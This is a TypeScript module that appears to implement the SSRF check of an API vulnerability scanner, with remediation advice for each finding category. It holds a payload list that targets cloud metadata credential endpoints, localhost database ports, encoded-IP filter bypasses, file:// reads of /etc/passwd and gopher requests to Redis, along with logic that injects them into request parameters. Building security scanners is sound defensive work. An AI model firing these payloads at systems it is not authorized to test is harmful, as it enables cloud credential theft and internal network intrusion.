import { AxiosResponse } from "axios";
import { scannerClient } from "@/server/core/http/scanner-client";
import { SecurityCheck, ScanTarget, FindingResult, Evidence } from "@/types";
import { logger } from "@/server/core/logging/logger";

const log = logger.child("ssrf-check");

/* ── Internal / Cloud Metadata IPs and URLs ── */
const SSRF_TARGETS: { url: string; label: string; severity: "CRITICAL" | "HIGH" | "MEDIUM"; category: string }[] = [
    // AWS Metadata Service (IMDSv1)
    { url: "http://169.254.169.254/latest/meta-data/", label: "AWS EC2 Metadata (IMDSv1)", severity: "CRITICAL", category: "cloud-metadata" },
    { url: "http://169.254.169.254/latest/meta-data/iam/security-credentials/", label: "AWS IAM Credentials", severity: "CRITICAL", category: "cloud-metadata" },
    { url: "http://169.254.169.254/latest/user-data/", label: "AWS User Data", severity: "CRITICAL", category: "cloud-metadata" },
    { url: "http://169.254.169.254/latest/dynamic/instance-identity/document", label: "AWS Instance Identity", severity: "HIGH", category: "cloud-metadata" },

    // GCP Metadata
    { url: "http://metadata.google.internal/computeMetadata/v1/", label: "GCP Compute Metadata", severity: "CRITICAL", category: "cloud-metadata" },
    { url: "http://metadata.google.internal/computeMetadata/v1/instance/service-accounts/default/token", label: "GCP Service Account Token", severity: "CRITICAL", category: "cloud-metadata" },

    // Azure Metadata
    { url: "http://169.254.169.254/metadata/instance?api-version=2021-02-01", label: "Azure Instance Metadata", severity: "CRITICAL", category: "cloud-metadata" },
    { url: "http://169.254.169.254/metadata/identity/oauth2/token?api-version=2018-02-01&resource=https://management.azure.com/", label: "Azure Managed Identity Token", severity: "CRITICAL", category: "cloud-metadata" },

    // DigitalOcean Metadata
    { url: "http://169.254.169.254/metadata/v1.json", label: "DigitalOcean Metadata", severity: "HIGH", category: "cloud-metadata" },

    // Kubernetes
    { url: "https://kubernetes.default.svc/", label: "Kubernetes API Server", severity: "CRITICAL", category: "internal-service" },
    { url: "http://kubernetes.default.svc:443/", label: "Kubernetes API (HTTP)", severity: "CRITICAL", category: "internal-service" },

    // Internal network probing
    { url: "http://127.0.0.1/", label: "Localhost (127.0.0.1)", severity: "HIGH", category: "internal-network" },
    { url: "http://127.0.0.1:22/", label: "Localhost SSH (port 22)", severity: "HIGH", category: "internal-network" },
    { url: "http://127.0.0.1:3306/", label: "Localhost MySQL (port 3306)", severity: "HIGH", category: "internal-network" },
    { url: "http://127.0.0.1:5432/", label: "Localhost PostgreSQL (port 5432)", severity: "HIGH", category: "internal-network" },
    { url: "http://127.0.0.1:6379/", label: "Localhost Redis (port 6379)", severity: "HIGH", category: "internal-network" },
    { url: "http://127.0.0.1:27017/", label: "Localhost MongoDB (port 27017)", severity: "HIGH", category: "internal-network" },
    { url: "http://127.0.0.1:9200/", label: "Localhost Elasticsearch (port 9200)", severity: "HIGH", category: "internal-network" },
    { url: "http://127.0.0.1:8500/", label: "Localhost Consul (port 8500)", severity: "HIGH", category: "internal-network" },
    { url: "http://localhost/", label: "Localhost (hostname)", severity: "HIGH", category: "internal-network" },
    { url: "http://0.0.0.0/", label: "All interfaces (0.0.0.0)", severity: "HIGH", category: "internal-network" },
    { url: "http://[::1]/", label: "IPv6 localhost (::1)", severity: "HIGH", category: "internal-network" },

    // Internal network ranges
    { url: "http://10.0.0.1/", label: "Internal 10.x range", severity: "MEDIUM", category: "internal-network" },
    { url: "http://172.16.0.1/", label: "Internal 172.16.x range", severity: "MEDIUM", category: "internal-network" },
    { url: "http://192.168.1.1/", label: "Internal 192.168.x range", severity: "MEDIUM", category: "internal-network" },

    // Bypass techniques — decimal IP
    { url: "http://2852039166/", label: "Decimal IP bypass (169.254.169.254)", severity: "HIGH", category: "bypass" },
    // Bypass — shortened
    { url: "http://169.254.169.254.nip.io/latest/meta-data/", label: "DNS rebinding via nip.io", severity: "HIGH", category: "bypass" },
    // Bypass — URL encoding
    { url: "http://0x7f000001/", label: "Hex IP bypass (127.0.0.1)", severity: "HIGH", category: "bypass" },
    // Bypass — IPv6 mapping
    { url: "http://[::ffff:127.0.0.1]/", label: "IPv6-mapped IPv4 bypass", severity: "HIGH", category: "bypass" },
    // Bypass — rare notation
    { url: "http://017700000001/", label: "Octal IP bypass (127.0.0.1)", severity: "HIGH", category: "bypass" },

    // File protocol
    { url: "file:///etc/passwd", label: "File protocol (Linux /etc/passwd)", severity: "CRITICAL", category: "file-protocol" },
    { url: "file:///c:/windows/system.ini", label: "File protocol (Windows system.ini)", severity: "CRITICAL", category: "file-protocol" },

    // Gopher protocol (if supported)
    { url: "gopher://127.0.0.1:6379/_INFO", label: "Gopher protocol to Redis", severity: "CRITICAL", category: "protocol-smuggling" },
];

/* ─── Common SSRF-prone API parameter names ─── */
const SSRF_PARAM_NAMES = [
    "url", "uri", "link", "href", "src", "source",
    "target", "dest", "destination", "redirect", "return",
    "returnUrl", "returnTo", "callback", "callbackUrl",
    "next", "nextUrl", "image", "imageUrl", "img",
    "avatar", "avatarUrl", "icon", "iconUrl",
    "feed", "feedUrl", "rss", "webhook", "webhookUrl",
    "proxy", "proxyUrl", "fetch", "fetchUrl",
    "path", "file", "load", "page", "site",
    "api", "endpoint", "host", "domain",
    "preview", "previewUrl", "unfurl",
];

/* ─── SSRF Response Indicators ─── */
const CLOUD_METADATA_SIGNATURES = [
    "ami-id", "instance-id", "instance-type", "local-hostname",
    "local-ipv4", "public-keys", "security-credentials",
    "iam", "placement", "availability-zone",
    "accountId", "instanceId", "imageId",
    "access_token", "token_type", "expires_in",
    "computeMetadata", "service-accounts",
    "root:", "/bin/", "nologin", // /etc/passwd
    "REDIS", "redis_version", // Redis
    "cluster_name", "cluster_uuid", // Elasticsearch
];

const INTERNAL_SERVICE_SIGNATURES = [
    "SSH-", "OpenSSH", "MySQL", "MariaDB",
    "PostgreSQL", "redis_version", "MongoDB",
    "elasticsearch", "consul", "etcd",
];

export class SsrfCheck implements SecurityCheck {
    name = "Server-Side Request Forgery (SSRF) Check";
    description = "Detects SSRF by probing for cloud metadata access (AWS/GCP/Azure), internal network reachability, protocol smuggling, and IP bypass techniques";
    owaspMapping = "Server Side Request Forgery";
    owaspId = "API7:2023";

    async run(target: ScanTarget): Promise<FindingResult[]> {
        const findings: FindingResult[] = [];
        const foundCategories = new Set<string>();

        for (const endpoint of target.endpoints) {
            const url = `${target.baseUrl}${endpoint.path}`;
            const method = endpoint.method.toLowerCase();

            // Determine SSRF injection points
            const ssrfParams = this.findSsrfParams(endpoint);

            for (const ssrfTarget of SSRF_TARGETS) {
                // Limit per category to avoid excessive testing
                const categoryKey = `${endpoint.path}:${ssrfTarget.category}`;
                if (foundCategories.has(categoryKey)) continue;

                for (const paramConfig of ssrfParams) {
                    try {
                        const headers: Record<string, string> = {
                            "User-Agent": "SecuriScan/1.0",
                            "Content-Type": "application/json",
                            ...(endpoint.customHeaders || {}),
                        };
                        if (target.authConfig?.value) {
                            headers["Authorization"] = target.authConfig.type === "api_key"
                                ? target.authConfig.value
                                : `Bearer ${target.authConfig.value}`;
                        }

                        // For GCP metadata, add required header
                        if (ssrfTarget.url.includes("metadata.google.internal")) {
                            headers["Metadata-Flavor"] = "Google";
                        }

                        const requestConfig: Record<string, unknown> = {
                            requestsPerSecond: target.requestsPerSecond,
                            method,
                            timeout: 10000,
                            validateStatus: () => true,
                            headers,
                        };

                        if (paramConfig.type === "query") {
                            const sep = url.includes("?") ? "&" : "?";
                            requestConfig.url = `${url}${sep}${paramConfig.name}=${encodeURIComponent(ssrfTarget.url)}`;
                        } else if (paramConfig.type === "body") {
                            requestConfig.url = url;
                            if (endpoint.requestBody) {
                                try {
                                    const body = JSON.parse(endpoint.requestBody);
                                    body[paramConfig.name] = ssrfTarget.url;
                                    requestConfig.data = body;
                                } catch {
                                    requestConfig.data = { [paramConfig.name]: ssrfTarget.url };
                                }
                            } else {
                                requestConfig.data = { [paramConfig.name]: ssrfTarget.url };
                            }
                        } else if (paramConfig.type === "header") {
                            headers[paramConfig.name] = ssrfTarget.url;
                            requestConfig.url = url;
                        }

                        const response = await scannerClient(requestConfig);
                        const responseBody = typeof response.data === "string"
                            ? response.data
                            : JSON.stringify(response.data || "");
                        const lowerBody = responseBody.toLowerCase();

                        let isVulnerable = false;
                        let evidenceDesc = "";

                        // Check for cloud metadata signatures
                        if (ssrfTarget.category === "cloud-metadata") {
                            const matched = CLOUD_METADATA_SIGNATURES.filter(sig => lowerBody.includes(sig.toLowerCase()));
                            if (matched.length >= 2) {
                                isVulnerable = true;
                                evidenceDesc = `CRITICAL SSRF: Cloud metadata service is accessible! The response contains cloud metadata signatures: ${matched.join(", ")}. An attacker can extract IAM credentials, instance identity, and other sensitive cloud configuration.`;
                            }
                        }

                        // Check for internal service signatures
                        if (ssrfTarget.category === "internal-network" || ssrfTarget.category === "internal-service") {
                            const matched = INTERNAL_SERVICE_SIGNATURES.filter(sig => lowerBody.includes(sig.toLowerCase()));
                            if (matched.length > 0 || (response.status >= 200 && response.status < 300 && responseBody.length > 10)) {
                                const hasServiceSig = matched.length > 0;
                                isVulnerable = true;
                                evidenceDesc = `SSRF: Internal service at ${ssrfTarget.url} is reachable from the server. ${hasServiceSig ? `Service signatures detected: ${matched.join(", ")}.` : `The server returned HTTP ${response.status} with ${responseBody.length} bytes of data.`} Attackers can use this to scan the internal network, access databases, and exfiltrate data.`;
                            }
                        }

                        // Check for file protocol
                        if (ssrfTarget.category === "file-protocol") {
                            const fileSignatures = ["root:", "/bin/", "[drivers]", "16-bit"];
                            const matched = fileSignatures.filter(sig => lowerBody.includes(sig.toLowerCase()));
                            if (matched.length > 0) {
                                isVulnerable = true;
                                evidenceDesc = `CRITICAL SSRF via file:// protocol! The server fetched a local file (${ssrfTarget.url}) and returned its contents. Signatures found: ${matched.join(", ")}.`;
                            }
                        }

                        // Check for bypass techniques
                        if (ssrfTarget.category === "bypass") {
                            const matched = CLOUD_METADATA_SIGNATURES.filter(sig => lowerBody.includes(sig.toLowerCase()));
                            if (matched.length > 0) {
                                isVulnerable = true;
                                evidenceDesc = `SSRF bypass successful! IP obfuscation technique (${ssrfTarget.label}) circumvented SSRF protections. Cloud metadata signatures: ${matched.join(", ")}. The SSRF filter can be bypassed using alternative IP encodings.`;
                            }
                        }

                        // Check gopher protocol
                        if (ssrfTarget.category === "protocol-smuggling" && response.status >= 200 && response.status < 300) {
                            isVulnerable = true;
                            evidenceDesc = `SSRF via ${ssrfTarget.url.split(":")[0]}:// protocol! The server supports alternative protocols that can be used for protocol smuggling attacks against internal services.`;
                        }

                        if (isVulnerable) {
                            foundCategories.add(categoryKey);
                            findings.push({
                                checkType: "ssrf",
                                severity: ssrfTarget.severity,
                                title: `SSRF — ${ssrfTarget.label}: ${endpoint.method} ${endpoint.path}`,
                                description: `${evidenceDesc}\n\nPayload URL: ${ssrfTarget.url}\nInjection point: ${paramConfig.type} parameter "${paramConfig.name}"`,
                                evidence: this.buildEvidence(
                                    typeof requestConfig.url === "string" ? requestConfig.url : url,
                                    endpoint.method, headers, response, ssrfTarget.url
                                ),
                                owaspMapping: this.owaspMapping,
                                owaspId: this.owaspId,
                                remediation: this.getRemediation(ssrfTarget.category),
                                endpoint: endpoint.path,
                                method: endpoint.method,
                            });
                            break; // One finding per param per category
                        }
                    } catch (err) {
                        log.debug(`SSRF probe skipped: ${err instanceof Error ? err.message : String(err)}`);
                    }
                }
            }
        }

        return findings;
    }

    private findSsrfParams(endpoint: { path: string; method: string; parameters?: { name: string; in: string }[]; requestBody?: string; description?: string }): { name: string; type: "query" | "body" | "header" }[] {
        const params: { name: string; type: "query" | "body" | "header" }[] = [];

        // Check declared parameters
        for (const p of (endpoint.parameters || [])) {
            if (SSRF_PARAM_NAMES.includes(p.name.toLowerCase())) {
                params.push({ name: p.name, type: p.in === "body" ? "body" : p.in === "header" ? "header" : "query" });
            }
        }

        // If no declared params match, inject common SSRF params
        if (params.length === 0) {
            const method = endpoint.method.toLowerCase();
            if (["post", "put", "patch"].includes(method)) {
                params.push({ name: "url", type: "body" });
                params.push({ name: "target", type: "body" });
                params.push({ name: "callback", type: "body" });
            }
            params.push({ name: "url", type: "query" });
            params.push({ name: "redirect", type: "query" });
        }

        return params.slice(0, 4); // Limit to avoid excessive testing
    }

    private getRemediation(category: string): string {
        const rems: Record<string, string> = {
            "cloud-metadata": `CRITICAL: Block access to cloud metadata services:\n\n\`\`\`javascript\nconst dns = require('dns');\nconst { URL } = require('url');\n\nasync function validateUrl(userUrl) {\n  const parsed = new URL(userUrl);\n  \n  // 1. Force HTTPS only\n  if (parsed.protocol !== 'https:') throw new Error('HTTPS required');\n  \n  // 2. Resolve DNS and check for internal IPs\n  const { address } = await dns.promises.lookup(parsed.hostname);\n  const blocked = ['169.254.', '127.', '10.', '172.16.', '192.168.', '0.', '::1'];\n  if (blocked.some(prefix => address.startsWith(prefix))) {\n    throw new Error('Internal addresses blocked');\n  }\n  \n  // 3. Use AWS IMDSv2 (requires PUT token request)\n  // Configure EC2: aws ec2 modify-instance-metadata-options --http-tokens required\n}\n\`\`\``,
            "internal-network": `Block internal network access from application-layer requests:\n\n\`\`\`javascript\n// Use an allowlist of permitted external domains\nconst ALLOWED_DOMAINS = ['api.example.com', 'cdn.example.com'];\n\nfunction validateUrl(url) {\n  const parsed = new URL(url);\n  if (!ALLOWED_DOMAINS.includes(parsed.hostname)) {\n    throw new Error('Domain not in allowlist');\n  }\n}\n\`\`\`\n\nNetwork-level defenses:\n- Deploy outbound proxy/firewall rules\n- Block RFC1918 addresses in egress rules\n- Use network policies in Kubernetes`,
            "internal-service": "Isolate application pods/containers from sensitive internal services. Use network segmentation and service mesh policies to restrict outbound connections.",
            "bypass": `Implement robust IP validation that handles all encoding formats:\n\n\`\`\`javascript\nconst net = require('net');\n\nfunction isInternalIP(ip) {\n  // Normalize IP first, then check\n  if (net.isIPv4(ip)) {\n    const parts = ip.split('.').map(Number);\n    return parts[0] === 127 || parts[0] === 10 ||\n      (parts[0] === 172 && parts[1] >= 16 && parts[1] <= 31) ||\n      (parts[0] === 192 && parts[1] === 168) ||\n      (parts[0] === 169 && parts[1] === 254);\n  }\n  return ip === '::1' || ip.startsWith('::ffff:127.');\n}\n\`\`\``,
            "file-protocol": "Block all non-HTTP(S) protocols. Validate URL schemes with a strict allowlist: only 'https://' should be permitted.",
            "protocol-smuggling": "Block Gopher, FTP, and other legacy protocols. Only allow HTTPS requests from user-supplied URLs.",
        };
        return rems[category] || "Implement URL validation with DNS resolution checks, block internal IP ranges, and enforce HTTPS-only outbound requests.";
    }

    private buildEvidence(url: string, method: string, headers: Record<string, string>, response: AxiosResponse, payload: string): Evidence {
        return {
            request: { url, method, headers },
            response: {
                status: response.status,
                headers: response.headers as Record<string, string>,
                body: typeof response.data === "object" ? response.data : String(response.data).slice(0, 500),
            },
            description: `SSRF probe targeting ${payload} via ${method} ${url}`,
            payload,
        };
    }
}
